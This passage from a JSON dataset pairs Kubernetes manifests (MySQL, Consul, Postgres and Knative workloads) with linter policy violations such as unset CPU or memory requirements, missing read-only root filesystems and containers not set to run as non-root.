    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-server\n  labels:\n    app: python\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: python\n      tier: mysql\n  template:\n    metadata:\n      labels:\n        app: python\n        tier: mysql\n    spec:\n      containers:\n      - image: mysql\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysecret\n              key: key\n        ports:\n        - containerPort: 3306\n          name: mysql\n        volumeMounts:\n        - name: mysql-persistent-storage\n          mountPath: /var/lib/mysql\n      volumes:\n      - name: mysql-persistent-storage\n        persistentVolumeClaim:\n          claimName: mysql-pvc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mysql\" has cpu request 0"
  },
  {
    "id": "2381",
    "manifest_path": "data/manifests/the_stack_sample/sample_0607.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-server\n  labels:\n    app: python\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: python\n      tier: mysql\n  template:\n    metadata:\n      labels:\n        app: python\n        tier: mysql\n    spec:\n      containers:\n      - image: mysql\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysecret\n              key: key\n        ports:\n        - containerPort: 3306\n          name: mysql\n        volumeMounts:\n        - name: mysql-persistent-storage\n          mountPath: /var/lib/mysql\n      volumes:\n      - name: mysql-persistent-storage\n        persistentVolumeClaim:\n          claimName: mysql-pvc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mysql\" has memory limit 0"
  },
  {
    "id": "2382",
    "manifest_path": "data/manifests/the_stack_sample/sample_0608.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: postgres\n  labels:\n    app: postgres\nspec:\n  type: NodePort\n  ports:\n  - port: 5432\n    nodePort: 32432\n  selector:\n    app: postgres\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:postgres])"
  },
  {
    "id": "2383",
    "manifest_path": "data/manifests/the_stack_sample/sample_0609.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: go-hpa\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 8080\n  selector:\n    app: go-hpa\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:go-hpa])"
  },
  {
    "id": "2384",
    "manifest_path": "data/manifests/the_stack_sample/sample_0610.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: consul\n  namespace: consul-back\nspec:\n  selector:\n    matchLabels:\n      app: consul\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: consul\n        storageClassName: rook-ceph-block\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - consul\n            topologyKey: kubernetes.io/hostname\n      serviceAccountName: consul\n      securityContext:\n        fsGroup: 1000\n      containers:\n      - name: consul-exporter\n        args:\n        - --consul.server=127.0.0.1:8500\n        - --consul.ca-file=/etc/tls/ca.pem\n        - --consul.cert-file=/etc/tls/consul-back.pem\n        - --consul.key-file=/etc/tls/consul-back-key.pem\n        image: prom/consul-exporter:v0.4.0\n        ports:\n        - name: metrics\n          containerPort: 9107\n        volumeMounts:\n        - mountPath: /etc/tls\n          name: tls\n      - name: consul\n        image: consul:1.6.1\n        env:\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: GOSSIP_ENCRYPTION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: consul\n              key: gossip-encryption-key\n        - name: CONSUL_HTTP_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tokens\n              key: acl.tokens.agent\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        args:\n        - consul\n        - agent\n        - -advertise=$(POD_IP)\n        - -bind=0.0.0.0\n        - -bootstrap-expect=3\n        - -retry-join\n        - provider=k8s namespace=$(NAMESPACE) label_selector=\"app=consul\"\n        - -client=0.0.0.0\n        - -config-file=/consul/myconfig/config.json\n        - -datacenter=dc1\n        - -data-dir=/consul/data\n        - -domain=cluster.local\n        - -encrypt=$(GOSSIP_ENCRYPTION_KEY)\n        - -server\n        - -ui\n        - -disable-host-node-id\n        readinessProbe:\n          exec:\n            command:\n            - /bin/sh\n            - -ec\n            - 'curl http://127.0.0.1:8500/v1/status/leader 2>/dev/null | \\\n\n              grep -E ''\".+\"''\n\n              '\n          failureThreshold: 2\n          initialDelaySeconds: 120\n          periodSeconds: 5\n          successThreshold: 2\n          timeoutSeconds: 5\n        livenessProbe:\n          exec:\n            command:\n            - consul\n            - members\n            - -http-addr=http://127.0.0.1:8500\n          initialDelaySeconds: 300\n          timeoutSeconds: 5\n        volumeMounts:\n        - name: data\n          mountPath: /consul/data\n        - name: tls\n          mountPath: /etc/tls\n        - name: config\n          mountPath: /consul/myconfig\n        resources:\n          requests:\n            memory: 128Mi\n            cpu: 250m\n          limits:\n            memory: 256Mi\n            cpu: 500m\n        ports:\n        - containerPort: 8500\n          name: ui-port\n        - containerPort: 8400\n          name: alt-port\n        - containerPort: 53\n          name: udp-port\n        - containerPort: 8443\n          name: https-port\n        - containerPort: 8080\n          name: http-port\n        - containerPort: 8301\n          name: serflan\n        - containerPort: 8302\n          name: serfwan\n        - containerPort: 8600\n          name: consuldns\n        - containerPort: 8300\n          name: server\n      volumes:\n      - name: tls\n        secret:\n          secretName: consul\n      - name: tokens\n        secret:\n          secretName: tokens\n      - name: config\n        configMap:\n          name: consul\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"consul\" does not have a read-only root file system"
  },
  {
    "id": "2385",
    "manifest_path": "data/manifests/the_stack_sample/sample_0610.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: consul\n  namespace: consul-back\nspec:\n  selector:\n    matchLabels:\n      app: consul\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: consul\n        storageClassName: rook-ceph-block\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - consul\n            topologyKey: kubernetes.io/hostname\n      serviceAccountName: consul\n      securityContext:\n        fsGroup: 1000\n      containers:\n      - name: consul-exporter\n        args:\n        - --consul.server=127.0.0.1:8500\n        - --consul.ca-file=/etc/tls/ca.pem\n        - --consul.cert-file=/etc/tls/consul-back.pem\n        - --consul.key-file=/etc/tls/consul-back-key.pem\n        image: prom/consul-exporter:v0.4.0\n        ports:\n        - name: metrics\n          containerPort: 9107\n        volumeMounts:\n        - mountPath: /etc/tls\n          name: tls\n      - name: consul\n        image: consul:1.6.1\n        env:\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: GOSSIP_ENCRYPTION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: consul\n              key: gossip-encryption-key\n        - name: CONSUL_HTTP_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tokens\n              key: acl.tokens.agent\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        args:\n        - consul\n        - agent\n        - -advertise=$(POD_IP)\n        - -bind=0.0.0.0\n        - -bootstrap-expect=3\n        - -retry-join\n        - provider=k8s namespace=$(NAMESPACE) label_selector=\"app=consul\"\n        - -client=0.0.0.0\n        - -config-file=/consul/myconfig/config.json\n        - -datacenter=dc1\n        - -data-dir=/consul/data\n        - -domain=cluster.local\n        - -encrypt=$(GOSSIP_ENCRYPTION_KEY)\n        - -server\n        - -ui\n        - -disable-host-node-id\n        readinessProbe:\n          exec:\n            command:\n            - /bin/sh\n            - -ec\n            - 'curl http://127.0.0.1:8500/v1/status/leader 2>/dev/null | \\\n\n              grep -E ''\".+\"''\n\n              '\n          failureThreshold: 2\n          initialDelaySeconds: 120\n          periodSeconds: 5\n          successThreshold: 2\n          timeoutSeconds: 5\n        livenessProbe:\n          exec:\n            command:\n            - consul\n            - members\n            - -http-addr=http://127.0.0.1:8500\n          initialDelaySeconds: 300\n          timeoutSeconds: 5\n        volumeMounts:\n        - name: data\n          mountPath: /consul/data\n        - name: tls\n          mountPath: /etc/tls\n        - name: config\n          mountPath: /consul/myconfig\n        resources:\n          requests:\n            memory: 128Mi\n            cpu: 250m\n          limits:\n            memory: 256Mi\n            cpu: 500m\n        ports:\n        - containerPort: 8500\n          name: ui-port\n        - containerPort: 8400\n          name: alt-port\n        - containerPort: 53\n          name: udp-port\n        - containerPort: 8443\n          name: https-port\n        - containerPort: 8080\n          name: http-port\n        - containerPort: 8301\n          name: serflan\n        - containerPort: 8302\n          name: serfwan\n        - containerPort: 8600\n          name: consuldns\n        - containerPort: 8300\n          name: server\n      volumes:\n      - name: tls\n        secret:\n          secretName: consul\n      - name: tokens\n        secret:\n          secretName: tokens\n      - name: config\n        configMap:\n          name: consul\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"consul-exporter\" does not have a read-only root file system"
  },
  {
    "id": "2386",
    "manifest_path": "data/manifests/the_stack_sample/sample_0610.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: consul\n  namespace: consul-back\nspec:\n  selector:\n    matchLabels:\n      app: consul\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: consul\n        storageClassName: rook-ceph-block\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - consul\n            topologyKey: kubernetes.io/hostname\n      serviceAccountName: consul\n      securityContext:\n        fsGroup: 1000\n      containers:\n      - name: consul-exporter\n        args:\n        - --consul.server=127.0.0.1:8500\n        - --consul.ca-file=/etc/tls/ca.pem\n        - --consul.cert-file=/etc/tls/consul-back.pem\n        - --consul.key-file=/etc/tls/consul-back-key.pem\n        image: prom/consul-exporter:v0.4.0\n        ports:\n        - name: metrics\n          containerPort: 9107\n        volumeMounts:\n        - mountPath: /etc/tls\n          name: tls\n      - name: consul\n        image: consul:1.6.1\n        env:\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: GOSSIP_ENCRYPTION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: consul\n              key: gossip-encryption-key\n        - name: CONSUL_HTTP_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tokens\n              key: acl.tokens.agent\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        args:\n        - consul\n        - agent\n        - -advertise=$(POD_IP)\n        - -bind=0.0.0.0\n        - -bootstrap-expect=3\n        - -retry-join\n        - provider=k8s namespace=$(NAMESPACE) label_selector=\"app=consul\"\n        - -client=0.0.0.0\n        - -config-file=/consul/myconfig/config.json\n        - -datacenter=dc1\n        - -data-dir=/consul/data\n        - -domain=cluster.local\n        - -encrypt=$(GOSSIP_ENCRYPTION_KEY)\n        - -server\n        - -ui\n        - -disable-host-node-id\n        readinessProbe:\n          exec:\n            command:\n            - /bin/sh\n            - -ec\n            - 'curl http://127.0.0.1:8500/v1/status/leader 2>/dev/null | \\\n\n              grep -E ''\".+\"''\n\n              '\n          failureThreshold: 2\n          initialDelaySeconds: 120\n          periodSeconds: 5\n          successThreshold: 2\n          timeoutSeconds: 5\n        livenessProbe:\n          exec:\n            command:\n            - consul\n            - members\n            - -http-addr=http://127.0.0.1:8500\n          initialDelaySeconds: 300\n          timeoutSeconds: 5\n        volumeMounts:\n        - name: data\n          mountPath: /consul/data\n        - name: tls\n          mountPath: /etc/tls\n        - name: config\n          mountPath: /consul/myconfig\n        resources:\n          requests:\n            memory: 128Mi\n            cpu: 250m\n          limits:\n            memory: 256Mi\n            cpu: 500m\n        ports:\n        - containerPort: 8500\n          name: ui-port\n        - containerPort: 8400\n          name: alt-port\n        - containerPort: 53\n          name: udp-port\n        - containerPort: 8443\n          name: https-port\n        - containerPort: 8080\n          name: http-port\n        - containerPort: 8301\n          name: serflan\n        - containerPort: 8302\n          name: serfwan\n        - containerPort: 8600\n          name: consuldns\n        - containerPort: 8300\n          name: server\n      volumes:\n      - name: tls\n        secret:\n          secretName: consul\n      - name: tokens\n        secret:\n          secretName: tokens\n      - name: config\n        configMap:\n          name: consul\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"consul\" not found"
  },
  {
    "id": "2387",
    "manifest_path": "data/manifests/the_stack_sample/sample_0610.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: consul\n  namespace: consul-back\nspec:\n  selector:\n    matchLabels:\n      app: consul\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: consul\n        storageClassName: rook-ceph-block\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - consul\n            topologyKey: kubernetes.io/hostname\n      serviceAccountName: consul\n      securityContext:\n        fsGroup: 1000\n      containers:\n      - name: consul-exporter\n        args:\n        - --consul.server=127.0.0.1:8500\n        - --consul.ca-file=/etc/tls/ca.pem\n        - --consul.cert-file=/etc/tls/consul-back.pem\n        - --consul.key-file=/etc/tls/consul-back-key.pem\n        image: prom/consul-exporter:v0.4.0\n        ports:\n        - name: metrics\n          containerPort: 9107\n        volumeMounts:\n        - mountPath: /etc/tls\n          name: tls\n      - name: consul\n        image: consul:1.6.1\n        env:\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: GOSSIP_ENCRYPTION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: consul\n              key: gossip-encryption-key\n        - name: CONSUL_HTTP_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tokens\n              key: acl.tokens.agent\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        args:\n        - consul\n        - agent\n        - -advertise=$(POD_IP)\n        - -bind=0.0.0.0\n        - -bootstrap-expect=3\n        - -retry-join\n        - provider=k8s namespace=$(NAMESPACE) label_selector=\"app=consul\"\n        - -client=0.0.0.0\n        - -config-file=/consul/myconfig/config.json\n        - -datacenter=dc1\n        - -data-dir=/consul/data\n        - -domain=cluster.local\n        - -encrypt=$(GOSSIP_ENCRYPTION_KEY)\n        - -server\n        - -ui\n        - -disable-host-node-id\n        readinessProbe:\n          exec:\n            command:\n            - /bin/sh\n            - -ec\n            - 'curl http://127.0.0.1:8500/v1/status/leader 2>/dev/null | \\\n\n              grep -E ''\".+\"''\n\n              '\n          failureThreshold: 2\n          initialDelaySeconds: 120\n          periodSeconds: 5\n          successThreshold: 2\n          timeoutSeconds: 5\n        livenessProbe:\n          exec:\n            command:\n            - consul\n            - members\n            - -http-addr=http://127.0.0.1:8500\n          initialDelaySeconds: 300\n          timeoutSeconds: 5\n        volumeMounts:\n        - name: data\n          mountPath: /consul/data\n        - name: tls\n          mountPath: /etc/tls\n        - name: config\n          mountPath: /consul/myconfig\n        resources:\n          requests:\n            memory: 128Mi\n            cpu: 250m\n          limits:\n            memory: 256Mi\n            cpu: 500m\n        ports:\n        - containerPort: 8500\n          name: ui-port\n        - containerPort: 8400\n          name: alt-port\n        - containerPort: 53\n          name: udp-port\n        - containerPort: 8443\n          name: https-port\n        - containerPort: 8080\n          name: http-port\n        - containerPort: 8301\n          name: serflan\n        - containerPort: 8302\n          name: serfwan\n        - containerPort: 8600\n          name: consuldns\n        - containerPort: 8300\n          name: server\n      volumes:\n      - name: tls\n        secret:\n          secretName: consul\n      - name: tokens\n        secret:\n          secretName: tokens\n      - name: config\n        configMap:\n          name: consul\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"consul\" is not set to runAsNonRoot"
  },
  {
    "id": "2388",
    "manifest_path": "data/manifests/the_stack_sample/sample_0610.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: consul\n  namespace: consul-back\nspec:\n  selector:\n    matchLabels:\n      app: consul\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: consul\n        storageClassName: rook-ceph-block\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - consul\n            topologyKey: kubernetes.io/hostname\n      serviceAccountName: consul\n      securityContext:\n        fsGroup: 1000\n      containers:\n      - name: consul-exporter\n        args:\n        - --consul.server=127.0.0.1:8500\n        - --consul.ca-file=/etc/tls/ca.pem\n        - --consul.cert-file=/etc/tls/consul-back.pem\n        - --consul.key-file=/etc/tls/consul-back-key.pem\n        image: prom/consul-exporter:v0.4.0\n        ports:\n        - name: metrics\n          containerPort: 9107\n        volumeMounts:\n        - mountPath: /etc/tls\n          name: tls\n      - name: consul\n        image: consul:1.6.1\n        env:\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: GOSSIP_ENCRYPTION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: consul\n              key: gossip-encryption-key\n        - name: CONSUL_HTTP_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tokens\n              key: acl.tokens.agent\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        args:\n        - consul\n        - agent\n        - -advertise=$(POD_IP)\n        - -bind=0.0.0.0\n        - -bootstrap-expect=3\n        - -retry-join\n        - provider=k8s namespace=$(NAMESPACE) label_selector=\"app=consul\"\n        - -client=0.0.0.0\n        - -config-file=/consul/myconfig/config.json\n        - -datacenter=dc1\n        - -data-dir=/consul/data\n        - -domain=cluster.local\n        - -encrypt=$(GOSSIP_ENCRYPTION_KEY)\n        - -server\n        - -ui\n        - -disable-host-node-id\n        readinessProbe:\n          exec:\n            command:\n            - /bin/sh\n            - -ec\n            - 'curl http://127.0.0.1:8500/v1/status/leader 2>/dev/null | \\\n\n              grep -E ''\".+\"''\n\n              '\n          failureThreshold: 2\n          initialDelaySeconds: 120\n          periodSeconds: 5\n          successThreshold: 2\n          timeoutSeconds: 5\n        livenessProbe:\n          exec:\n            command:\n            - consul\n            - members\n            - -http-addr=http://127.0.0.1:8500\n          initialDelaySeconds: 300\n          timeoutSeconds: 5\n        volumeMounts:\n        - name: data\n          mountPath: /consul/data\n        - name: tls\n          mountPath: /etc/tls\n        - name: config\n          mountPath: /consul/myconfig\n        resources:\n          requests:\n            memory: 128Mi\n            cpu: 250m\n          limits:\n            memory: 256Mi\n            cpu: 500m\n        ports:\n        - containerPort: 8500\n          name: ui-port\n        - containerPort: 8400\n          name: alt-port\n        - containerPort: 53\n          name: udp-port\n        - containerPort: 8443\n          name: https-port\n        - containerPort: 8080\n          name: http-port\n        - containerPort: 8301\n          name: serflan\n        - containerPort: 8302\n          name: serfwan\n        - containerPort: 8600\n          name: consuldns\n        - containerPort: 8300\n          name: server\n      volumes:\n      - name: tls\n        secret:\n          secretName: consul\n      - name: tokens\n        secret:\n          secretName: tokens\n      - name: config\n        configMap:\n          name: consul\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"consul-exporter\" is not set to runAsNonRoot"
  },
  {
    "id": "2389",
    "manifest_path": "data/manifests/the_stack_sample/sample_0610.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: consul\n  namespace: consul-back\nspec:\n  selector:\n    matchLabels:\n      app: consul\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: consul\n        storageClassName: rook-ceph-block\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - consul\n            topologyKey: kubernetes.io/hostname\n      serviceAccountName: consul\n      securityContext:\n        fsGroup: 1000\n      containers:\n      - name: consul-exporter\n        args:\n        - --consul.server=127.0.0.1:8500\n        - --consul.ca-file=/etc/tls/ca.pem\n        - --consul.cert-file=/etc/tls/consul-back.pem\n        - --consul.key-file=/etc/tls/consul-back-key.pem\n        image: prom/consul-exporter:v0.4.0\n        ports:\n        - name: metrics\n          containerPort: 9107\n        volumeMounts:\n        - mountPath: /etc/tls\n          name: tls\n      - name: consul\n        image: consul:1.6.1\n        env:\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: GOSSIP_ENCRYPTION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: consul\n              key: gossip-encryption-key\n        - name: CONSUL_HTTP_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tokens\n              key: acl.tokens.agent\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        args:\n        - consul\n        - agent\n        - -advertise=$(POD_IP)\n        - -bind=0.0.0.0\n        - -bootstrap-expect=3\n        - -retry-join\n        - provider=k8s namespace=$(NAMESPACE) label_selector=\"app=consul\"\n        - -client=0.0.0.0\n        - -config-file=/consul/myconfig/config.json\n        - -datacenter=dc1\n        - -data-dir=/consul/data\n        - -domain=cluster.local\n        - -encrypt=$(GOSSIP_ENCRYPTION_KEY)\n        - -server\n        - -ui\n        - -disable-host-node-id\n        readinessProbe:\n          exec:\n            command:\n            - /bin/sh\n            - -ec\n            - 'curl http://127.0.0.1:8500/v1/status/leader 2>/dev/null | \\\n\n              grep -E ''\".+\"''\n\n              '\n          failureThreshold: 2\n          initialDelaySeconds: 120\n          periodSeconds: 5\n          successThreshold: 2\n          timeoutSeconds: 5\n        livenessProbe:\n          exec:\n            command:\n            - consul\n            - members\n            - -http-addr=http://127.0.0.1:8500\n          initialDelaySeconds: 300\n          timeoutSeconds: 5\n        volumeMounts:\n        - name: data\n          mountPath: /consul/data\n        - name: tls\n          mountPath: /etc/tls\n        - name: config\n          mountPath: /consul/myconfig\n        resources:\n          requests:\n            memory: 128Mi\n            cpu: 250m\n          limits:\n            memory: 256Mi\n            cpu: 500m\n        ports:\n        - containerPort: 8500\n          name: ui-port\n        - containerPort: 8400\n          name: alt-port\n        - containerPort: 53\n          name: udp-port\n        - containerPort: 8443\n          name: https-port\n        - containerPort: 8080\n          name: http-port\n        - containerPort: 8301\n          name: serflan\n        - containerPort: 8302\n          name: serfwan\n        - containerPort: 8600\n          name: consuldns\n        - containerPort: 8300\n          name: server\n      volumes:\n      - name: tls\n        secret:\n          secretName: consul\n      - name: tokens\n        secret:\n          secretName: tokens\n      - name: config\n        configMap:\n          name: consul\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"consul-exporter\" has cpu request 0"
  },
  {
    "id": "2390",
    "manifest_path": "data/manifests/the_stack_sample/sample_0610.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: consul\n  namespace: consul-back\nspec:\n  selector:\n    matchLabels:\n      app: consul\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: consul\n        storageClassName: rook-ceph-block\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - consul\n            topologyKey: kubernetes.io/hostname\n      serviceAccountName: consul\n      securityContext:\n        fsGroup: 1000\n      containers:\n      - name: consul-exporter\n        args:\n        - --consul.server=127.0.0.1:8500\n        - --consul.ca-file=/etc/tls/ca.pem\n        - --consul.cert-file=/etc/tls/consul-back.pem\n        - --consul.key-file=/etc/tls/consul-back-key.pem\n        image: prom/consul-exporter:v0.4.0\n        ports:\n        - name: metrics\n          containerPort: 9107\n        volumeMounts:\n        - mountPath: /etc/tls\n          name: tls\n      - name: consul\n        image: consul:1.6.1\n        env:\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: GOSSIP_ENCRYPTION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: consul\n              key: gossip-encryption-key\n        - name: CONSUL_HTTP_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: tokens\n              key: acl.tokens.agent\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        args:\n        - consul\n        - agent\n        - -advertise=$(POD_IP)\n        - -bind=0.0.0.0\n        - -bootstrap-expect=3\n        - -retry-join\n        - provider=k8s namespace=$(NAMESPACE) label_selector=\"app=consul\"\n        - -client=0.0.0.0\n        - -config-file=/consul/myconfig/config.json\n        - -datacenter=dc1\n        - -data-dir=/consul/data\n        - -domain=cluster.local\n        - -encrypt=$(GOSSIP_ENCRYPTION_KEY)\n        - -server\n        - -ui\n        - -disable-host-node-id\n        readinessProbe:\n          exec:\n            command:\n            - /bin/sh\n            - -ec\n            - 'curl http://127.0.0.1:8500/v1/status/leader 2>/dev/null | \\\n\n              grep -E ''\".+\"''\n\n              '\n          failureThreshold: 2\n          initialDelaySeconds: 120\n          periodSeconds: 5\n          successThreshold: 2\n          timeoutSeconds: 5\n        livenessProbe:\n          exec:\n            command:\n            - consul\n            - members\n            - -http-addr=http://127.0.0.1:8500\n          initialDelaySeconds: 300\n          timeoutSeconds: 5\n        volumeMounts:\n        - name: data\n          mountPath: /consul/data\n        - name: tls\n          mountPath: /etc/tls\n        - name: config\n          mountPath: /consul/myconfig\n        resources:\n          requests:\n            memory: 128Mi\n            cpu: 250m\n          limits:\n            memory: 256Mi\n            cpu: 500m\n        ports:\n        - containerPort: 8500\n          name: ui-port\n        - containerPort: 8400\n          name: alt-port\n        - containerPort: 53\n          name: udp-port\n        - containerPort: 8443\n          name: https-port\n        - containerPort: 8080\n          name: http-port\n        - containerPort: 8301\n          name: serflan\n        - containerPort: 8302\n          name: serfwan\n        - containerPort: 8600\n          name: consuldns\n        - containerPort: 8300\n          name: server\n      volumes:\n      - name: tls\n        secret:\n          secretName: consul\n      - name: tokens\n        secret:\n          secretName: tokens\n      - name: config\n        configMap:\n          name: consul\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"consul-exporter\" has memory limit 0"
  },
  {
    "id": "2391",
    "manifest_path": "data/manifests/the_stack_sample/sample_0611.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: knative-serving-install\n    app.kubernetes.io/instance: knative-serving-install-v0.11.1\n    app.kubernetes.io/managed-by: kfctl\n    app.kubernetes.io/name: knative-serving-install\n    app.kubernetes.io/part-of: kubeflow\n    app.kubernetes.io/version: v0.11.1\n    kustomize.component: knative\n    serving.knative.dev/release: v0.11.1\n  name: activator\n  namespace: knative-serving\nspec:\n  selector:\n    matchLabels:\n      app: activator\n      app.kubernetes.io/component: knative-serving-install\n      app.kubernetes.io/instance: knative-serving-install-v0.11.1\n      app.kubernetes.io/managed-by: kfctl\n      app.kubernetes.io/name: knative-serving-install\n      app.kubernetes.io/part-of: kubeflow\n      app.kubernetes.io/version: v0.11.1\n      kustomize.component: knative\n      role: activator\n  template:\n    metadata:\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'false'\n        sidecar.istio.io/inject: 'true'\n      labels:\n        app: activator\n        app.kubernetes.io/component: knative-serving-install\n        app.kubernetes.io/instance: knative-serving-install-v0.11.1\n        app.kubernetes.io/managed-by: kfctl\n        app.kubernetes.io/name: knative-serving-install\n        app.kubernetes.io/part-of: kubeflow\n        app.kubernetes.io/version: v0.11.1\n        kustomize.component: knative\n        role: activator\n        serving.knative.dev/release: v0.11.1\n    spec:\n      containers:\n      - env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/internal/serving\n        image: gcr.io/knative-releases/knative.dev/serving/cmd/activator@sha256:8e606671215cc029683e8cd633ec5de9eabeaa6e9a4392ff289883304be1f418\n        livenessProbe:\n          httpGet:\n            httpHeaders:\n            - name: k-kubelet-probe\n              value: activator\n            path: /healthz\n            port: 8012\n        name: activator\n        ports:\n        - containerPort: 8012\n          name: http1\n        - containerPort: 8013\n          name: h2c\n        - containerPort: 9090\n          name: metrics\n        - containerPort: 8008\n          name: profiling\n        readinessProbe:\n          httpGet:\n            httpHeaders:\n            - name: k-kubelet-probe\n              value: activator\n            path: /healthz\n            port: 8012\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 600Mi\n          requests:\n            cpu: 300m\n            memory: 60Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n      serviceAccountName: controller\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"activator\" does not have a read-only root file system"
  },
  {
    "id": "2392",
    "manifest_path": "data/manifests/the_stack_sample/sample_0611.yaml",
